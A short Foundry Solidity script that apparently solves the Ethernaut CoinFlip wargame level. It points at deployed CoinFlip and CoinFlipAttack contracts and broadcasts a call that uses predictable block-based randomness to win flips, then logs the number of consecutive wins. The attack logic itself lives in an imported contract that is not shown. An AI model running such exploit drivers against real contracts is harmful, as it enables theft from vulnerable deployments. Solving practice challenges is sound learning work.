pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {CoinFlip} from "../src/CoinFlip.sol";
import {CoinFlipAttack} from "../src/CoinFlipAttack.sol";

contract CoinFlipScript is Script {
    CoinFlip public coin = CoinFlip(0xc4Bd02419Cfeb19bBf803990bbF18824ef16762b);
    CoinFlipAttack public attack = CoinFlipAttack(payable(0x18BAbb031164DA8BcF72f02D6D70a2204820C797));
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    event CoinFlipResult(uint256 blockNumber, uint256 blockValue, uint256 coinFlip, bool result, uint256 consecutiveWins);

    function setUp() public {
    }

    function run() public {

        vm.startBroadcast();

        attack.flip(coin);

        console.log(coin.consecutiveWins());

        vm.stopBroadcast();
    }
}